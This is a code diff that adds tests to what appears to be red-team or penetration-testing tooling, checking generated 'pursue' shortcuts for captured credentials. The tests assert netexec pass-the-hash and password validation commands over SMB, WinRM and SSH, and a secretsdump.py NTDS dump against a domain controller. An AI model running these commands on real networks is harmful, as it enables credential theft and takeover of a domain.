@@ -7,6 +7,7 @@ import {
   formatPursueShortcut,
   formatContainShortcut,
   buildAssessPrompt,
+  credValidationCmds,
 } from '../../.pi/extensions/lib/operator-shortcuts.ts';
 
 const linuxSession = {
@@ -65,6 +66,37 @@ test('formatPursueShortcut generates chase board from intel snapshot', () => {
   assert.match(output, /deploy-key/);
   assert.match(output, /10.10.10.5,10.10.10.20/);
   assert.match(output, /intel_update.*valid_on/);
+});
+
+test('credential validation commands cover SMB, WinRM, and SSH for password and NTLM material', () => {
+  const ntlm = credValidationCmds('ntlm-hash', 'Administrator', 'admin-ntlm', '10.10.10.5,10.10.10.20');
+  assert.deepEqual(ntlm.map(cmd => cmd.match(/^netexec\s+(\S+)/)?.[1]), ['smb', 'winrm', 'ssh']);
+  assert.ok(ntlm.every(cmd => cmd.includes('-H <hash from intel_get_cred(id="admin-ntlm")>')));
+
+  const password = credValidationCmds('password', 'svc-web', 'svc-web-pass', '10.10.10.5,10.10.10.20');
+  assert.deepEqual(password.map(cmd => cmd.match(/^netexec\s+(\S+)/)?.[1]), ['smb', 'winrm', 'ssh']);
+  assert.ok(password.every(cmd => cmd.includes('-p \'<password from intel_get_cred(id="svc-web-pass")>\'')));
+});
+
+test('formatPursueShortcut surfaces secretsdump for confirmed NTLM hashes on Windows hosts', () => {
+  const snap = {
+    unvalidatedCreds: [],
+    activeCreds: [
+      { id: 'da-ntlm', type: 'ntlm-hash', username: 'Administrator', domain: 'CORP', status: 'confirmed', validOn: ['dc01'] },
+    ],
+    knownHostIps: ['10.10.10.20', '10.10.10.5'],
+    knownHostIds: ['dc01', 'web01'],
+    knownHosts: [
+      { id: 'dc01', ip: '10.10.10.20', platform: 'windows', role: 'domain-controller', endpoints: ['tcp://10.10.10.20:445', 'tcp://10.10.10.20:5985'] },
+      { id: 'web01', ip: '10.10.10.5', platform: 'linux', endpoints: ['tcp://10.10.10.5:22'] },
+    ],
+  };
+  const output = formatPursueShortcut([windowsSession], snap);
+  assert.match(output, /CONFIRMED \/ ACTIVE CREDENTIALS/);
+  assert.match(output, /netexec smb 10\.10\.10\.20,10\.10\.10\.5 -u Administrator -H/);
+  assert.match(output, /netexec winrm 10\.10\.10\.20,10\.10\.10\.5 -u Administrator -H/);
+  assert.match(output, /netexec ssh 10\.10\.10\.20,10\.10\.10\.5 -u Administrator -H/);
+  assert.match(output, /secretsdump\.py CORP\/Administrator -hashes :<hash from intel_get_cred\(id="da-ntlm"\)> @10\.10\.10\.20  # NTDS dump if target is DC \(dc01\)/);
 });
 
 test('formatPursueShortcut shows fallback when no intel', () => {
